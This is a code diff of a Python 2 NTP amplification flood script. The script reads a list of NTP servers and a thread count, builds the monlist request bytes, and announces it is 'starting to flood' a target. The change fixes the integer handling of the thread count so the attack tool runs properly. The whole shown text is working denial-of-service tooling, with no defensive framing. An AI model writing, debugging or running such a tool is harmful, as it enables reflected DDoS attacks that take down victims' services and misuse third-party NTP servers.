@@ -31,8 +31,7 @@ if target == "help":
 	print "MAKE SURE YOUR THREAD COUNT IS LESS THAN OR EQUAL TO YOUR NUMBER OF SERVERS"
 	exit(0)
 ntpserverfile = sys.argv[2]
-numberthreads = sys.argv[3]
-
+numberthreads = int(sys.argv[3])
 #System for accepting bulk input
 ntplist = []
 currentserver = 0
@@ -40,7 +39,7 @@ with open(ntpserverfile) as f:
     ntplist = f.readlines()
 
 #Make sure we dont out of bounds
-if len(ntplist) < numberthreads:
+if  numberthreads > int(len(ntplist)):
 	print "Attack Aborted: More threads than servers"
 	print "Next time dont create more threads than servers"
 	exit(0)
@@ -50,7 +49,7 @@ data=str("\x17\x00\x03\x2a") + str("\x00")*4
 
 #Hold our threads
 threads = []
-print "Starting to flood: "+ target + " using NTP list: " + ntpserverfile + " With " + numberthreads + " threads"
+print "Starting to flood: "+ target + " using NTP list: " + ntpserverfile + " With " + str(numberthreads) + " threads"
 print "Use CTRL+C to stop attack"
 
 #Thread spawner
